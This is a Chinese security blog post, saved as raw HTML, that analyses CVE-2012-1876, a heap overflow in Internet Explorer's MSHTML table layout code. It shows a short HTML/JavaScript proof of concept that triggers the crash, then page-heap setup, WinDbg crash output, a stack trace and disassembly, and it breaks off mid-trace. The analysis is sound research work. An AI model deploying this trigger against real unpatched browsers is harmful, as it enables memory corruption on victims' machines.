<!DOCTYPE html>




<html class="theme-next muse" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="giantbranch,漏洞分析,漏洞挖掘,二进制,CTF,Web安全">





  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">






<meta name="description" content="[toc] 这是Pwn2Own黑客大赛上用于攻破IE9的漏洞 分析环境 Windows 7 32位VM 12IE8windbgida  基于HPA的漏洞分析方法poc 123456789101112131415161718&amp;lt;html&amp;gt;	&amp;lt;body&amp;gt;	&amp;lt;table style=&quot;table-layout:fixed&quot; &amp;gt;	    &amp;lt;col id=&quot;132&quot;">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞">
<meta property="og:url" content="https://www.giantbranch.cn/2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/index.html">
<meta property="og:site_name" content="giantbranch&#39;s blog">
<meta property="og:description" content="[toc] 这是Pwn2Own黑客大赛上用于攻破IE9的漏洞 分析环境 Windows 7 32位VM 12IE8windbgida  基于HPA的漏洞分析方法poc 123456789101112131415161718&amp;lt;html&amp;gt;	&amp;lt;body&amp;gt;	&amp;lt;table style=&quot;table-layout:fixed&quot; &amp;gt;	    &amp;lt;col id=&quot;132&quot;">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://pic.giantbranch.cn/1503585304863.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1503585874610.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1503586156367.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1503586515170.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1505701712480.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1505705073086.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1505896787170.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1505961234216.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1505962114658.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1505963807949.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506041191693.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1505984286959.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506039920068.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1505979301766.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506064995038.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506068091376.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506066222991.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506418072512.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506068309987.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506332366177.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506333353394.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506333816847.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506334215517.jpg">
<meta property="og:image" content="http://pic.giantbranch.cn/1506415872810.jpg">
<meta property="og:updated_time" content="2023-10-13T13:14:33.050Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞">
<meta name="twitter:description" content="[toc] 这是Pwn2Own黑客大赛上用于攻破IE9的漏洞 分析环境 Windows 7 32位VM 12IE8windbgida  基于HPA的漏洞分析方法poc 123456789101112131415161718&amp;lt;html&amp;gt;	&amp;lt;body&amp;gt;	&amp;lt;table style=&quot;table-layout:fixed&quot; &amp;gt;	    &amp;lt;col id=&quot;132&quot;">
<meta name="twitter:image" content="http://pic.giantbranch.cn/1503585304863.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.giantbranch.cn/2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/">





  <title>CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞 | giantbranch's blog</title>
  






  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">giantbranch's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-vulfound">
          <a href="/vulfound/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
            
            漏洞挖掘
          </a>
        </li>
      
        
        <li class="menu-item menu-item-book">
          <a href="/book/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
            
            读过的书
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            站点地图
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="giantbranch">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="giantbranch's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-19T00:00:00+00:00">
                2017-08-19
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>[toc]</p>
<p>这是Pwn2Own黑客大赛上用于攻破IE9的漏洞</p>
<h1 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h1><blockquote>
<p>Windows 7 32位<br>VM 12<br>IE8<br>windbg<br>ida</p>
</blockquote>
<h1 id="基于HPA的漏洞分析方法"><a href="#基于HPA的漏洞分析方法" class="headerlink" title="基于HPA的漏洞分析方法"></a>基于HPA的漏洞分析方法</h1><p>poc</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"1"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">		function over_trigger() &#123;</span></span><br><span class="line"><span class="undefined">		    var obj_col = document.getElementById("132");</span></span><br><span class="line"><span class="undefined">		    obj_col.width = "42765";</span></span><br><span class="line"><span class="undefined">		    obj_col.span = 1000;</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">		setTimeout("over_trigger();",1);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先开启页堆</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Debugging Tools <span class="keyword">for</span> Windows (x86)&gt;gflags<span class="selector-class">.exe</span> -<span class="selector-tag">i</span> iexplore<span class="selector-class">.exe</span> +hpa</span><br><span class="line">Current Registry Settings <span class="keyword">for</span> iexplore<span class="selector-class">.exe</span> executable are: <span class="number">02000000</span></span><br><span class="line">    hpa - Enable page heap</span><br></pre></td></tr></table></figure>

<p>打开poc，附加，允许阻止内容，我一下子就断下来了，不用设置子进程调试模式</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">69260000</span> <span class="number">69312000</span>   C:\Windows\System32\jscript.dll</span><br><span class="line">(6ec.cc8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000009</span> <span class="built_in">ebx</span>=<span class="number">00414114</span> <span class="built_in">ecx</span>=<span class="number">04141149</span> <span class="built_in">edx</span>=<span class="number">00004141</span> <span class="built_in">esi</span>=06c91000 <span class="built_in">edi</span>=06c91018</span><br><span class="line"><span class="built_in">eip</span>=656af167 <span class="built_in">esp</span>=045cdf28 <span class="built_in">ebp</span>=045cdf34 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+<span class="number">0x15</span>:</span><br><span class="line">656af167 890f            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>],<span class="built_in">ecx</span>  <span class="built_in">ds</span>:<span class="number">0023</span>:06c91018=????????</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; .childdbg</span><br><span class="line">Processes created by the current process will <span class="keyword">not</span> be debugged</span><br></pre></td></tr></table></figure>

<p>可能作者附加的进程不是主进程，试了一下，果然是这个问题。</p>
<p>看下栈</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0462db0c 67d95b8e 00414114 0462de50 00000001 mshtml!CTableColCalc::AdjustForCol+0x15</span><br><span class="line">0462dbbc 67c00713 00000001 0462de50 000003e8 mshtml!CTableLayout::CalculateMinMax+0x52f</span><br><span class="line">0462ddd8 67beaf19 0462de50 0462de1c 00000001 mshtml!CTableLayout::CalculateLayout+0x276</span><br><span class="line">0462df84 67cdcc48 0462f5f8 0462e1b0 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720</span><br><span class="line">0462e0bc 67ccf5d0 08533ea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class="line">0462e180 67ccf31d 08533ea8 00012174 00012174 mshtml!CFlowLayout::MeasureSite+0x312</span><br><span class="line">0462e1c8 67ccf664 07e14f00 00000061 0462f5f8 mshtml!CFlowLayout::GetSiteWidth+0x156</span><br><span class="line">0462e208 67ccfb40 07607fb0 08533ea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce</span><br><span class="line">0462e28c 70fb665d 087f2ff8 0462e2ac 0462e370 mshtml!CEmbeddedILSObj::Fmt+0x150</span><br><span class="line">0462e31c 70fb6399 087daefc 00000000 087ded20 msls31!ProcessOneRun+0x3e9</span><br><span class="line">0462e378 70fb6252 087daf18 00012a86 00000000 msls31!FetchAppendEscCore+0x18e</span><br><span class="line">0462e3cc 70fb61c3 00000000 00000000 00000014 msls31!LsDestroyLine+0x47f</span><br><span class="line">0462e454 70fb293f 00000007 00002b6c 00000000 msls31!LsDestroyLine+0x9ff</span><br><span class="line">0462e490 67ccdd81 00000001 00000007 00002b6c msls31!LsCreateLine+0xcb</span><br><span class="line">0462e5e0 67ce17cc 0462f5f8 00000007 07607fc0 mshtml!CLSMeasurer::LSDoCreateLine+0x127</span><br><span class="line">0462e684 67ce1ef5 0462eee8 00012174 00000000 mshtml!CLSMeasurer::LSMeasure+0x34</span><br><span class="line">0462e6cc 67ce1db1 00000000 00012944 00000083 mshtml!CLSMeasurer::Measure+0x1e6</span><br><span class="line">0462e6f0 67ce11a2 00012944 00000083 07e14f40 mshtml!CLSMeasurer::MeasureLine+0x1c</span><br><span class="line">0462e7a0 67d0a8f6 0462ecc0 08529fd8 00000083 mshtml!CRecalcLinePtr::MeasureLine+0x46d</span><br><span class="line">0462efa8 67d0b304 0462f5f8 00000007 0000000e mshtml!CDisplay::RecalcLines+0x8bb</span><br><span class="line">0462f0f8 67d08c5c 0462f5f8 00000007 0000000e mshtml!CDisplay::UpdateView+0x208</span><br><span class="line">0462f1ac 67d09ee3 0462f5f8 0462f730 0872cf10 mshtml!CFlowLayout::CommitChanges+0x9c</span><br><span class="line">0462f2bc 67beeb06 0462f5f8 0462f730 00000000 mshtml!CFlowLayout::CalcTextSize+0x30f</span><br><span class="line">0462f544 67ce02ee 07e14f00 0462f730 00000000 mshtml!CFlowLayout::CalcSizeCoreCompat+0x1045</span><br><span class="line">0462f560 67ce0367 0462f5f8 0462f730 00000000 mshtml!CFlowLayout::CalcSizeCore+0x49</span><br><span class="line">0462f59c 67ce029c 0462f5f8 0462f730 00000000 mshtml!CBodyLayout::CalcSizeCore+0xd8</span><br><span class="line">0462f5d4 67cdcc48 0462f5f8 0462f730 00000000 mshtml!CFlowLayout::CalcSizeVirtual+0x1af</span><br><span class="line">0462f70c 67c64121 07e14f00 00000001 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class="line">0462f7fc 67d090f9 00100000 00000007 0774ceb4 mshtml!CFlowLayout::DoLayout+0x543</span><br><span class="line">0462f838 67ccc8ca 0774c870 00100000 0462f898 mshtml!CView::ExecuteLayoutTasks+0x3b</span><br><span class="line">0462f87c 67d0336d 00000000 0462f8cc 00000035 mshtml!CView::EnsureView+0x355</span><br><span class="line">0462f8a4 67cc94b2 0774c870 00000000 05d3fd58 mshtml!CView::EnsureViewCallback+0xd3</span><br><span class="line">0462f8d8 67cb37f7 0462f974 00008002 00000000 mshtml!GlobalWndOnMethodCall+0xff</span><br><span class="line">0462f8f8 771f86ef 000301f6 00000012 00000000 mshtml!GlobalWndProc+0x10c</span><br><span class="line">0462f924 771f8876 67ca1de3 000301f6 00008002 USER32!InternalCallWinProc+0x23</span><br><span class="line">0462f99c 771f89b5 00000000 67ca1de3 000301f6 USER32!UserCallWinProcCheckWow+0x14b</span><br><span class="line">0462f9fc 771f8e9c 67ca1de3 00000000 0462fa84 USER32!DispatchMessageWorker+0x35e</span><br><span class="line">0462fa0c 6da104a6 0462fa24 00000000 0071cf58 USER32!DispatchMessageW+0xf</span><br><span class="line">0462fa84 6da20446 059be808 00000000 03336ff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x452</span><br><span class="line">0462fb3c 75a749bd 0071cf58 00000000 0462fb58 IEFRAME!LCIETab_ThreadProc+0x2c1</span><br><span class="line">0462fb4c 76fc1174 03336ff0 0462fb98 774ab3f5 iertutil!CIsoScope::RegisterThread+0xab</span><br><span class="line">0462fb58 774ab3f5 03336ff0 73050d5a 00000000 kernel32!BaseThreadInitThunk+0xe</span><br><span class="line">0462fb98 774ab3c8 75a749af 03336ff0 00000000 ntdll!__RtlUserThreadStart+0x70</span><br><span class="line">0462fbb0 00000000 75a749af 03336ff0 00000000 ntdll!_RtlUserThreadStart+0x1b</span><br></pre></td></tr></table></figure>

<p>向上看，edi来源与esi，esi这个函数看不到，是上层函数，也就是mshtml!CTableLayout::CalculateMinMax</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">67f1f152 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line">67f1f154 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line">67f1f155 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">67f1f157 8b08            <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]</span><br><span class="line">67f1f159 <span class="number">53</span>              <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line">67f1f15a 8b5d08          <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">67f1f15d <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line">67f1f15e 8bc1            <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">67f1f160 83e00f          <span class="keyword">and</span>     <span class="built_in">eax</span>,<span class="number">0Fh</span></span><br><span class="line">67f1f163 8d7e18          <span class="keyword">lea</span>     <span class="built_in">edi</span>,[<span class="built_in">esi</span>+<span class="number">18h</span>]</span><br><span class="line">67f1f166 <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">67f1f167 890f            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>],<span class="built_in">ecx</span>  <span class="built_in">ds</span>:<span class="number">0023</span>:<span class="number">08735018</span>=????????</span><br></pre></td></tr></table></figure>

<p>我们在mshtml!CTableLayout::CalculateMinMax下个断点跟一下</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; <span class="built_in">bp</span> mshtml!CTableLayout::CalculateMinMax</span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">69430000</span> 694e2000   C:\Windows\System32\jscript.dll</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=ffffffff <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00412802</span> <span class="built_in">edx</span>=ffffffff <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=0466e824</span><br><span class="line"><span class="built_in">eip</span>=673b018a <span class="built_in">esp</span>=0466e5c8 <span class="built_in">ebp</span>=0466e7e0 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">673b018a 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=ffffffff <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00412802</span> <span class="built_in">edx</span>=ffffffff <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=0466e824</span><br><span class="line"><span class="built_in">eip</span>=673b018c <span class="built_in">esp</span>=0466e5c8 <span class="built_in">ebp</span>=0466e7e0 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x2</span>:</span><br><span class="line">673b018c <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=ffffffff <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00412802</span> <span class="built_in">edx</span>=ffffffff <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=0466e824</span><br><span class="line"><span class="built_in">eip</span>=673b018d <span class="built_in">esp</span>=0466e5c4 <span class="built_in">ebp</span>=0466e7e0 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x3</span>:</span><br><span class="line">673b018d 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=ffffffff <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00412802</span> <span class="built_in">edx</span>=ffffffff <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=0466e824</span><br><span class="line"><span class="built_in">eip</span>=673b018f <span class="built_in">esp</span>=0466e5c4 <span class="built_in">ebp</span>=0466e5c4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span 